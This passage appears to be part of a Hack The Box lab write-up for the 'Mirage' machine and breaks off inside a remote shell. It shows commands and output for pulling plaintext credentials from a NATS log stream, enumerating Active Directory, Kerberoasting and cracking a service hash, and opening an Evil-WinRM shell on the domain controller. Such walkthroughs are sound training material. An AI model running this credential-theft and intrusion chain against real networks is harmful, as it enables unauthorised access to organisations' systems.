+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/natscli/nats]</span><br><span class="line">└─$ ./nats --context dev-nats sub <span class="string">&quot;&gt;&quot;</span> --count 10</span><br><span class="line">07:37:09 Subscribing on &gt; </span><br><span class="line">[<span class="comment">#1] Received on &quot;$JS.API.STREAM.INFO.auth_logs&quot; with reply &quot;_INBOX.NMAzt4nvFdFqsZnhM44z7C.KYtwv5BY&quot;</span></span><br><span class="line">nil body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="comment">#2] Received on &quot;_INBOX.NMAzt4nvFdFqsZnhM44z7C.KYtwv5BY&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;io.nats.jetstream.api.v1.stream_info_response&quot;</span>,<span class="string">&quot;total&quot;</span>:0,<span class="string">&quot;offset&quot;</span>:0,<span class="string">&quot;limit&quot;</span>:0,<span class="string">&quot;config&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;auth_logs&quot;</span>,<span class="string">&quot;subjects&quot;</span>:[<span class="string">&quot;logs.auth&quot;</span>],<span class="string">&quot;retention&quot;</span>:<span class="string">&quot;limits&quot;</span>,<span class="string">&quot;max_consumers&quot;</span>:-1,<span class="string">&quot;max_msgs&quot;</span>:100,<span class="string">&quot;max_bytes&quot;</span>:1048576,<span class="string">&quot;max_age&quot;</span>:0,<span class="string">&quot;max_msgs_per_subject&quot;</span>:-1,<span class="string">&quot;max_msg_size&quot;</span>:-1,<span class="string">&quot;discard&quot;</span>:<span class="string">&quot;new&quot;</span>,<span class="string">&quot;storage&quot;</span>:<span class="string">&quot;file&quot;</span>,<span class="string">&quot;num_replicas&quot;</span>:1,<span class="string">&quot;duplicate_window&quot;</span>:120000000000,<span class="string">&quot;compression&quot;</span>:<span class="string">&quot;none&quot;</span>,<span class="string">&quot;allow_direct&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;mirror_direct&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;sealed&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;deny_delete&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;deny_purge&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;allow_rollup_hdrs&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;consumer_limits&quot;</span>:&#123;&#125;,<span class="string">&quot;allow_msg_ttl&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;metadata&quot;</span>:&#123;<span class="string">&quot;_nats.level&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;_nats.req.level&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;_nats.ver&quot;</span>:<span class="string">&quot;2.11.3&quot;</span>&#125;&#125;,<span class="string">&quot;created&quot;</span>:<span class="string">&quot;2025-05-05T07:18:19.6244845Z&quot;</span>,<span class="string">&quot;state&quot;</span>:&#123;<span class="string">&quot;messages&quot;</span>:5,<span class="string">&quot;bytes&quot;</span>:570,<span class="string">&quot;first_seq&quot;</span>:1,<span class="string">&quot;first_ts&quot;</span>:<span class="string">&quot;2025-05-05T07:18:56.6788658Z&quot;</span>,<span class="string">&quot;last_seq&quot;</span>:5,<span class="string">&quot;last_ts&quot;</span>:<span class="string">&quot;2025-05-05T07:19:27.2106658Z&quot;</span>,<span class="string">&quot;num_subjects&quot;</span>:1,<span class="string">&quot;consumer_count&quot;</span>:0&#125;,<span class="string">&quot;cluster&quot;</span>:&#123;<span class="string">&quot;leader&quot;</span>:<span class="string">&quot;ND4DGBMCTG4RO3T52MUSCLNCS4XNDI26BXXEDYOTUQ56FIOZWP7UZWQM&quot;</span>&#125;,<span class="string">&quot;ts&quot;</span>:<span class="string">&quot;2025-07-23T18:38:02.1677807Z&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="comment">#3] Received on &quot;$JS.EVENT.ADVISORY.API&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;io.nats.jetstream.advisory.v1.api_audit&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="string">&quot;EsXhuVxO8oVlq8AGrgFeWO&quot;</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2025-07-23T18:38:02.1677807Z&quot;</span>,<span class="string">&quot;server&quot;</span>:<span class="string">&quot;ND4DGBMCTG4RO3T52MUSCLNCS4XNDI26BXXEDYOTUQ56FIOZWP7UZWQM&quot;</span>,<span class="string">&quot;client&quot;</span>:&#123;<span class="string">&quot;start&quot;</span>:<span class="string">&quot;2025-07-23T11:38:02.1672458-07:00&quot;</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.129.104.218&quot;</span>,<span class="string">&quot;id&quot;</span>:52,<span class="string">&quot;acc&quot;</span>:<span class="string">&quot;dev&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;Dev_Account_A&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;NATS CLI Version 0.2.2&quot;</span>,<span class="string">&quot;lang&quot;</span>:<span class="string">&quot;go&quot;</span>,<span class="string">&quot;ver&quot;</span>:<span class="string">&quot;1.41.1&quot;</span>,<span class="string">&quot;rtt&quot;</span>:534900,<span class="string">&quot;server&quot;</span>:<span class="string">&quot;ND4DGBMCTG4RO3T52MUSCLNCS4XNDI26BXXEDYOTUQ56FIOZWP7UZWQM&quot;</span>,<span class="string">&quot;kind&quot;</span>:<span class="string">&quot;Client&quot;</span>,<span class="string">&quot;client_type&quot;</span>:<span class="string">&quot;nats&quot;</span>&#125;,<span class="string">&quot;subject&quot;</span>:<span class="string">&quot;<span class="variable">$JS</span>.API.STREAM.INFO.auth_logs&quot;</span>,<span class="string">&quot;response&quot;</span>:<span class="string">&quot;&#123;\&quot;type\&quot;:\&quot;io.nats.jetstream.api.v1.stream_info_response\&quot;,\&quot;total\&quot;:0,\&quot;offset\&quot;:0,\&quot;limit\&quot;:0,\&quot;config\&quot;:&#123;\&quot;name\&quot;:\&quot;auth_logs\&quot;,\&quot;subjects\&quot;:[\&quot;logs.auth\&quot;],\&quot;retention\&quot;:\&quot;limits\&quot;,\&quot;max_consumers\&quot;:-1,\&quot;max_msgs\&quot;:100,\&quot;max_bytes\&quot;:1048576,\&quot;max_age\&quot;:0,\&quot;max_msgs_per_subject\&quot;:-1,\&quot;max_msg_size\&quot;:-1,\&quot;discard\&quot;:\&quot;new\&quot;,\&quot;storage\&quot;:\&quot;file\&quot;,\&quot;num_replicas\&quot;:1,\&quot;duplicate_window\&quot;:120000000000,\&quot;compression\&quot;:\&quot;none\&quot;,\&quot;allow_direct\&quot;:true,\&quot;mirror_direct\&quot;:false,\&quot;sealed\&quot;:false,\&quot;deny_delete\&quot;:true,\&quot;deny_purge\&quot;:true,\&quot;allow_rollup_hdrs\&quot;:false,\&quot;consumer_limits\&quot;:&#123;&#125;,\&quot;allow_msg_ttl\&quot;:false,\&quot;metadata\&quot;:&#123;\&quot;_nats.level\&quot;:\&quot;1\&quot;,\&quot;_nats.req.level\&quot;:\&quot;0\&quot;,\&quot;_nats.ver\&quot;:\&quot;2.11.3\&quot;&#125;&#125;,\&quot;created\&quot;:\&quot;2025-05-05T07:18:19.6244845Z\&quot;,\&quot;state\&quot;:&#123;\&quot;messages\&quot;:5,\&quot;bytes\&quot;:570,\&quot;first_seq\&quot;:1,\&quot;first_ts\&quot;:\&quot;2025-05-05T07:18:56.6788658Z\&quot;,\&quot;last_seq\&quot;:5,\&quot;last_ts\&quot;:\&quot;2025-05-05T07:19:27.2106658Z\&quot;,\&quot;num_subjects\&quot;:1,\&quot;consumer_count\&quot;:0&#125;,\&quot;cluster\&quot;:&#123;\&quot;leader\&quot;:\&quot;ND4DGBMCTG4RO3T52MUSCLNCS4XNDI26BXXEDYOTUQ56FIOZWP7UZWQM\&quot;&#125;,\&quot;ts\&quot;:\&quot;2025-07-23T18:38:02.1677807Z\&quot;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/natscli/nats]</span><br><span class="line">└─$ ./nats --context dev-nats consumer next auth_logs audit-reader --count=5 --<span class="built_in">wait</span>=5s --ack</span><br><span class="line">nats: error: could not load consumer <span class="string">&quot;audit-reader&quot;</span>: consumer not found (10014)</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~/natscli/nats]</span><br><span class="line">└─$ ./nats --context dev-nats consumer add auth_logs audit-reader --pull --ack=explicit     </span><br><span class="line">[dev-nats] ? Start policy (all, new, last, subject, 1h, msg sequence) all</span><br><span class="line">[dev-nats] ? Replay policy instant</span><br><span class="line">[dev-nats] ? Filter Stream by subjects (blank <span class="keyword">for</span> all) </span><br><span class="line">[dev-nats] ? Maximum Allowed Deliveries -1</span><br><span class="line">[dev-nats] ? Maximum Acknowledgments Pending 0</span><br><span class="line">[dev-nats] ? Deliver headers only without bodies No</span><br><span class="line">[dev-nats] ? Add a Retry Backoff Policy No</span><br><span class="line">Information <span class="keyword">for</span> Consumer auth_logs &gt; audit-reader created 2025-07-23 14:39:16</span><br><span class="line"></span><br><span class="line">Configuration:</span><br><span class="line"></span><br><span class="line">                    Name: audit-reader</span><br><span class="line">               Pull Mode: <span class="literal">true</span></span><br><span class="line">          Deliver Policy: All</span><br><span class="line">              Ack Policy: Explicit</span><br><span class="line">                Ack Wait: 30.00s</span><br><span class="line">           Replay Policy: Instant</span><br><span class="line">         Max Ack Pending: 1,000</span><br><span class="line">       Max Waiting Pulls: 512</span><br><span class="line"></span><br><span class="line">State:</span><br><span class="line"></span><br><span class="line">            Host Version: 2.11.3</span><br><span class="line">      Required API Level: 0 hosted at level 1</span><br><span class="line">  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0</span><br><span class="line">    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0</span><br><span class="line">        Outstanding Acks: 0 out of maximum 1,000</span><br><span class="line">    Redelivered Messages: 0</span><br><span class="line">    Unprocessed Messages: 5</span><br><span class="line">           Waiting Pulls: 0 of maximum 512</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~/natscli/nats]</span><br><span class="line">└─$ ./nats --context dev-nats consumer next auth_logs audit-reader --count=5 --<span class="built_in">wait</span>=5s --ack</span><br><span class="line">[07:39:20] subj: logs.auth / tries: 1 / cons <span class="built_in">seq</span>: 1 / str <span class="built_in">seq</span>: 1 / pending: 4</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;david.jjackson&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pN8kQmn6b86!1234@&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;10.10.10.20&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">Acknowledged message after 184.202072ms delay</span><br><span class="line"></span><br><span class="line">[07:39:21] subj: logs.auth / tries: 1 / cons <span class="built_in">seq</span>: 2 / str <span class="built_in">seq</span>: 2 / pending: 3</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;david.jjackson&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pN8kQmn6b86!1234@&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;10.10.10.20&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">Acknowledged message after 2.308247828s delay</span><br><span class="line"></span><br><span class="line">[07:39:23] subj: logs.auth / tries: 1 / cons <span class="built_in">seq</span>: 3 / str <span class="built_in">seq</span>: 3 / pending: 2</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;david.jjackson&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;pN8kQmn6b86!1234@&quot;</span>,<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;10.10.10.20&quot;</span>&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>david.jjackson:pN8kQmn6b86!1234@</code></p>
+<p>We can now use that to query the LDAP with bloodhound-python:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodhound-python -u david.jjackson -p <span class="string">&#x27;pN8kQmn6b86!1234@&#x27;</span> -k -d mirage.htb -ns 10.129.104.218 -c All --zip</span><br><span class="line">INFO: Found AD domain: mirage.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.mirage.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.mirage.htb</span><br><span class="line">INFO: Found 12 <span class="built_in">users</span></span><br><span class="line">INFO: Found 57 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 21 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.mirage.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 18S</span><br><span class="line">INFO: Compressing output into 20250723144033_bloodhound.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>We can also bruteforce RIDs:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[/tmp]</span><br><span class="line">└─$ nxc smb dc01.mirage.htb -u <span class="string">&#x27;david.jjackson&#x27;</span> -p <span class="string">&#x27;pN8kQmn6b86!1234@&#x27;</span> -k --rid-brute</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             498: MIRAGE\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                            </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             500: MIRAGE\Administrator (SidTypeUser)                                                                                       </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             501: MIRAGE\Guest (SidTypeUser)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             502: MIRAGE\krbtgt (SidTypeUser)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             512: MIRAGE\Domain Admins (SidTypeGroup)                                                                                      </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             513: MIRAGE\Domain Users (SidTypeGroup)                                                                                       </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             514: MIRAGE\Domain Guests (SidTypeGroup)                                                                                      </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             515: MIRAGE\Domain Computers (SidTypeGroup)                                                                                   </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             516: MIRAGE\Domain Controllers (SidTypeGroup)                                                                                 </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             517: MIRAGE\Cert Publishers (SidTypeAlias)                                                                                    </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             518: MIRAGE\Schema Admins (SidTypeGroup)                                                                                      </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             519: MIRAGE\Enterprise Admins (SidTypeGroup)                                                                                  </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             520: MIRAGE\Group Policy Creator Owners (SidTypeGroup)                                                                        </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             521: MIRAGE\Read-only Domain Controllers (SidTypeGroup)                                                                       </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             522: MIRAGE\Cloneable Domain Controllers (SidTypeGroup)                                                                       </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             525: MIRAGE\Protected Users (SidTypeGroup)                                                                                    </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             526: MIRAGE\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             527: MIRAGE\Enterprise Key Admins (SidTypeGroup)                                                                              </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             553: MIRAGE\RAS and IAS Servers (SidTypeAlias)                                                                                </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             571: MIRAGE\Allowed RODC Password Replication Group (SidTypeAlias)                                                            </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             572: MIRAGE\Denied RODC Password Replication Group (SidTypeAlias)                                                             </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1000: MIRAGE\DC01$ (SidTypeUser)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1101: MIRAGE\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1102: MIRAGE\DnsUpdateProxy (SidTypeGroup)                                                                                    </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1103: MIRAGE\Development Team (SidTypeGroup)                                                                                  </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1104: MIRAGE\Dev_Account_A (SidTypeUser)                                                                                      </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1105: MIRAGE\Dev_Account_B (SidTypeUser)                                                                                      </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1106: MIRAGE\IT_Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1107: MIRAGE\david.jjackson (SidTypeUser)                                                                                     </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1108: MIRAGE\javier.mmarshall (SidTypeUser)                                                                                   </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1109: MIRAGE\mark.bbond (SidTypeUser)</span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1110: MIRAGE\nathan.aadam (SidTypeUser)                                                                                       </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             1112: MIRAGE\Mirage-Service$ (SidTypeUser)                                                                                    </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             2601: MIRAGE\Exchange_Admins (SidTypeGroup)                                                                                   </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             2602: MIRAGE\IT_Support (SidTypeGroup)                                                                                        </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             2603: MIRAGE\IT_Contractors (SidTypeGroup)                                                                                    </span><br><span class="line">SMB         dc01.mirage.htb 445    dc01             2604: MIRAGE\svc_mirage (SidTypeUser)</span><br><span class="line">                                  </span><br></pre></td></tr></table></figure></div>
+
+
+<p>We ill also attempt kerberoasting to get some users hashes:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-GetUserSPNs <span class="string">&#x27;mirage.htb/david.jjackson&#x27;</span> -dc-host dc01.mirage.htb -k -request</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 17:18:18.584667  2025-07-04 16:01:43.511763             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$krb5tgs$23$*nathan.aadam<span class="variable">$MIRAGE</span>.HTB<span class="variable">$mirage</span>.htb/nathan.aadam*$a1830dfc38b31607d378067d21d40a99<span class="variable">$a8d5b23d2874eb50ba4a4d2414b21bba411eb7a48d3aafcabc598c823aa945514bea35554a3472adc2d6fae06196b82a3dc42975e60b4e27a06ba66cf7bfccf4ff0ad2140697fa5333e7bf2082acfc6281bd1c84ad19abd6771e07fff3272c8be472b810d792883afc426917f94f23303d335826f90a0f0ce1f0af997114735ff7fb569926a426a7ce6614bad8f4400b9da2038faf86e1af1fc97b4f3674a39788c3ea0a36b727c64f1a685dc156aa108dd4b3f0db0084942f3bd0ada521cd59bf8b50c0e8ffc0b4481fe04b78ef0da126945691f46f7cf4d61351e4fe510aa32229b8679cb26d77f4070b2aedd548a3580040240e28a895653e0a0df9e50bcceed63548ec59d2757df50463977e06e99a3b40320f5e133074432f920ee0b3268d89c6c60667647ae9e0b66928391e5ab3524b048952c42a05591b7c121b65d7c98cf245f054b970f680381086d0e87d081e9ed5d9f471ec07bdb67687b741c05b6744462141bdebd89a483ca086119c7ef63f9320a97942807c552539dde0f3c15ee5dfdbafb662cb074f7378c6188d68980e1c95ef8171a924788c0e9f4245c7b23ee2be370778b5ba795bf19e1cac0a83b972e92bc4386d782a0aae8d5f80ef1d65b9e69d2146dc94b5899a59398d8caeadc96e55b7d296cac500e3dda62b67d3cbd5db6ff3b81a265452403428efd5e142eaafe719492fe11a0f77ba2c4646f53850f54e9773ee8c97b353bbd1592849873d361d99265fed35a9f99289dedbd81f6a31367833b2888107a8d79e0ae07460fe3e4aee279875011cd37586552467cc7677598ad6416c98f594d1818bf13f4be2289584ed6a3cdc6da81ed4162f9b1d826417f9537eff1be2e1822dbd35dea5d5260d05203c4a14ef4b89b0bc335b03a0f5fb3dbdc122a4564a6bed24254482d1d9935d1a24ef5e91a8b8ee9e8b40dd9b86728da59edad56decfbd60aac59ce586f8e18a2bd8080951f970f167117caa80412262a69cc0951e9e43755c3acb0d5444d8fc6e04ae689a0230de0b43b33e94ae3c6ea80ba974ea9c5310a478988bef3f9630321a86dfb4d1273facd2d8de2f8119254d501f1d7ab8f7e1061ec65845da98f048028643894d0751e4a6ed4bd010897396c6f4b588b78b8ae44cc918062dd5d5b39f554dd9f8998f799403e6830a8099395f1f37e07108895ac826fe93e6c87585287f71e8c75985750e286e27ef8ab430c5ab3a66b54987c8cb70bb105b4b9cea96172cc9d242f5f6a5071f56ae3d568acad61b8b767cf387a252231fe2da6a9d3ff36558b05a0f2c09a85ccc584cc704dab32abdfba517300b20210ac7c17b9389c3dc0552cc4c1ef0bdc41372cf93135b35b5de19d4a9eb9b52a3e969d87f78ff0f340ca4d3402079dad2f664acaa190cb56b54b649e7b36b0aa818e2361f0a943f8cf3bb52a5a4154554a344b66d79efb93d2efa8e334f0924698b950ce251fc4df4a3d240f90c896e8f83df665a19d7cc29e8cb0e33456839d02c54af9d1f6973c9840fea1ba7bd8984c65b85595dad85935cfb083559afd8902087efb2f1c</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We crack the hash to get the password:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ john   --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span>                      </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">3edc<span class="comment">#EDC3        (?)     </span></span><br><span class="line">1g 0:00:00:03 DONE (2025-07-23 16:24) 0.2652g/s 3307Kp/s 3307Kc/s 3307KC/s 3er733..3ddfiebw</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                    </span><br></pre></td></tr></table></figure></div>
+
+<p>We request a ticket with this password and we get the user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ impacket-getTGT mirage.htb/nathan.aadam:<span class="string">&#x27;3edc#EDC3&#x27;</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> nathan.aadam.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">export</span> KRB5CCNAME=nathan.aadam.ccache</span><br><span class="line">                                                                                                        </span><br><span class="line">(base) ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                         </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                           </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\nathan.aadam\Documents&gt; <span class="built_in">cat</span> 